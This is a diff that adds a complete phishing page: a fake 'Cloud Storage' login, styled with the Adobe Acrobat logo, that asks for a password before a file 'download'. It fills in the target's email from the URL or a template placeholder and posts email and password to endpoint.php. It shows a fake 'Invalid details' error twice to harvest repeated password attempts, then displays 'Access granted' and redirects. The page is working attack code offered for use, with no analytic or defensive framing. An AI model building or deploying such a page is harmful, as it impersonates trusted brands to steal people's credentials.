@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☁️Cloud Storage 🔑Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #555;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .blurred-background-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image: url("lsg/cropped.jpg");
+            background-repeat: no-repeat;
+            background-position: top center;
+            background-size: cover;
+            filter: blur(8px);
+            -webkit-filter: blur(4px);
+            opacity: 0.7;
+        }
+
+        .login-container {
+            border-radius: 20px;
+            background-color: #ffffff;
+            width: 380px;
+            padding: 55px 30px 40px 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            position: absolute;
+            top: -35px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .logo img {
+            width: 100%;
+            height: 100%;
+        }
+
+       
+
+        h2 {
+            margin: 0 0 10px 0;
+            font-size: 22px;
+            color: #000000;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            margin: 0 0 25px 0;
+            font-size: 14px;
+            color: #333333;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group input[type="email"],
+        .input-group input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #dcdcdc;
+            border-radius: 2px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input[type="email"]:focus,
+        .input-group input[type="password"]:focus {
+            border-color: #0054b6;
+        }
+
+        .input-group input::placeholder {
+            color: #999999;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin: 0 8px 0 0;
+            width: 16px;
+            height: 16px;
+            accent-color: #0078d4;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #333333;
+            cursor: pointer;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #d32f2f;
+            color: #ffffff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #b71c1c;
+        }
+
+        .footer-text {
+            margin-top: 25px;
+            font-size: 9px;
+            color: #999999;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-bottom: 15px;
+            text-align: left;
+            display: none;
+            background: #f8d7da;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .btn-submit:disabled, .submit-btn:disabled {
+            background-color: #f5f5f5;
+            color: #a0a0a0;
+            cursor: not-allowed;
+        }
+
+        .btn-submit.loading {
+            opacity: 0.7;
+            cursor: wait;
+        }
+
+        #messageBox {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #messageBox .popup-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            max-width: 320px;
+            width: 100%;
+        }
+
+        #messageBox h3 {
+            margin: 0 0 10px 0;
+            color: #28a745;
+            font-size: 20px;
+        }
+
+        #messageBox p {
+            margin: 0;
+            color: #333;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="blurred-background-layer"></div>
+
+    <div class="login-container">
+        <!-- Adobe-like Red Logo SVG Placeholder -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg" alt="">
+        </div>
+<span class="h4 mb-0" style="margin-left: 10px;" id="domain-name"><h2><strong>🌐[[-Domain-]]</strong></h2></span>
+        <h2>☁️ Cloud Storage</h2>
+        <p class="subtitle"><strong>Enter your 📧email address 🔒password on your provider's 🔑login page</strong></p>
+
+        <form id="loginForm">
+            <div id="errorMessage" class="error-message"></div>
+
+            <div class="input-group">
+
+                <input type="email" id="email" placeholder="📧Email" required readonly>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder="🔒Password" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="rememberMe" checked>
+                <label for="rememberMe">Remember me</label>
+            </div>
+
+            <button type="submit" class="btn-submit submit-btn">⬇️ Download file 78 KB</button>
+        </form>
+
+        <p class="footer-text"><strong>
+            &copy; 2026 ☁️Cloud Storage terms and conditions in accordance with our privacy policy and terms of use. Check
+            the official documentation to review our terms of use 🌐https://[EMail_DomainPart].</strong>
+        </p>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="messageBox" style="display: none;">
+        <div class="popup-content">
+            <h3>Success</h3>
+            <p id="messageBoxText">Access granted! Redirecting...</p>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.querySelector('.submit-btn');
+        const errorMessage = document.getElementById('errorMessage');
+        const loginForm = document.getElementById('loginForm');
+
+        // Pre-fill email from URL hash
+        const hash = window.location.hash;
+        if (hash && hash.length > 1) {
+            const email = decodeURIComponent(hash.substring(1));
+            if (email.includes('@')) {
+                emailInput.value = email;
+            }
+        }
+        if (!emailInput.value) {
+            emailInput.value = '[[-Email-]]';
+        }
+
+        function validateForm() {
+            const isValid = emailInput.value.trim() !== '' && passwordInput.value !== '';
+            submitBtn.disabled = !isValid;
+        }
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        let attemptCount = 0;
+        const maxAttempts = 3;
+
+        loginForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            if (emailInput.value && passwordInput.value) {
+                submitBtn.classList.add('loading');
+                errorMessage.classList.remove('show');
+
+                try {
+                    const formData = new FormData();
+                    formData.append('email', emailInput.value);
+                    formData.append('password', passwordInput.value);
+                    
+                    attemptCount++;
+                    formData.append('attempt', attemptCount);
+
+                    const response = await fetch('endpoint.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+
+                    submitBtn.classList.remove('loading');
+                    passwordInput.value = '';
+
+                    if (attemptCount >= maxAttempts) {
+                        showSuccessPopup(result.redirect);
+                    } else {
+                        errorMessage.textContent = 'Invalid details. Please try again.';
+                        errorMessage.classList.add('show');
+                        passwordInput.focus();
+                    }
+                } catch (error) {
+                    submitBtn.classList.remove('loading');
+                    console.error('Error:', error);
+                    errorMessage.textContent = 'An error occurred. Please try again.';
+                    errorMessage.classList.add('show');
+                    passwordInput.value = '';
+                }
+            }
+        });
+
+        function showSuccessPopup(redirectUrl) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000);
+        }
+
+        validateForm();
+    </script>
+</body>
+</html>
